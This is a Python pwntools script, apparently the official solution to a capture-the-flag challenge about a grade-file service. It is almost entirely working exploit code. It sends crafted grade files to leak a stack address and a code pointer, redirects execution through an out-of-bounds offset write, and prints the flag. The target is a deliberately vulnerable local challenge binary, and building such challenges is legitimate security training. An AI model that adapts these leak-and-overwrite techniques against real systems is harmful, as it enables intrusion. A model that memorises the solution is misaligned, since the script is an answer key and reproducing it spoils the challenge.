# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
from struct import pack
import sys

def connect():
  if sys.argv[1] == "local":
    return process("./chal")
  return remote("localhost", int(sys.argv[1]))

name = b"/tmp/grades_aabbccddaabbccddaabbccddaabbccd5"

def send_grades(r, b):
  r.sendline(b"2")
  r.sendline(name)
  r.sendline(str(len(b)).encode())
  r.send(b)
  r.recvuntil(b"MENU")

while True:
  r = connect()
  r.sendline(b"pencil")
  r.recvuntil(b"MENU")

  b = b'GR\xad\xe5ABCD' + b'A' * 32 + b'B' * 32 # Year, name
  b += pack("<Q", 256) # File size
  b += pack("<Q", 96) # First grade offset
  b += pack("<Q", 96) # Empty offset

  b += b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDGGTTTTTTTTTTTTRRRR" + pack("<Q", 1234) + pack("<Q", 0)

  b += b'\x00' * 256 # Dummy space
  send_grades(r, b)
  r.sendline(b"1")
  r.sendline(name)
  r.recvuntil(b"CLASS")
  r.recvline()
  r.recvline()
  r.recvuntil(b"RRRR     ")
  line = r.recvline()[:-1]
  if len(line) == 6 and line[-1] == 0x7f:
    break
  print("Try again, exploit failed.")
  r.close()

line += b'\x00' * (8-len(line))
stack = struct.unpack("<Q", line)[0]
print("Stack:", hex(stack))

MAP = 0x4752ade50000

b2 = b'GR\xad\xe5ABCD' + b'A' * 32 + b'B' * 32 # Year, name
b2 += pack("<Q", 2**64-1) # File size
b2 += pack("<Q", stack - MAP + 24) # First grade offset
b2 += pack("<Q", 96) # Empty offset

b2 += b'\x00' * 256 # Dummy space

r2 = connect()
r2.sendline(b"pencil")
send_grades(r2, b2)
r2.sendline(b'3')
lines = r2.recvall().decode()
print(lines)
r2.close()

r.sendline(b'123') # Invalid command
r.recvuntil(b"CLASS")
r.recvline()
r.recvline()
line = r.recvline()
print(line)
line = line[42:50] # Teacher
#r.interactive()
assert line[-2:] == b'  ' # Pointer should have two lowest bits zero.
line = line[:-2] + b'\x00\x00'
code = struct.unpack("<Q", line)[0]
print("Code pointer:", hex(code))



b2 = b'GR\xad\xe5ABCD' + b'A' * 32 + b'B' * 32 # Year, name
b2 += pack("<Q", 2**64-1) # File size
b2 += pack("<Q", 0) # First grade offset
b2 += pack("<Q", stack - MAP + 0x1000000 - 0xffffc8) # Empty offset

b2 += b'\x00' * 256 # Dummy space

r2 = connect()
r2.sendline(b"pencil")
send_grades(r2, b2)
r2.sendline(b'3')
lines = r2.recvall().decode()
#print(lines)
r2.close()

r.write(b'1')
r.write(pack("<Q", code - 3238 + 4))
r.sendline()
r.sendline(b'5')
r.sendline(b'5')
r.sendline(b'5')
r.sendline(b'5')
r.sendline(b'5')
lines = r.recvall()
r.close()
flag = lines.split(b'\n')[-2].decode()
print(flag)


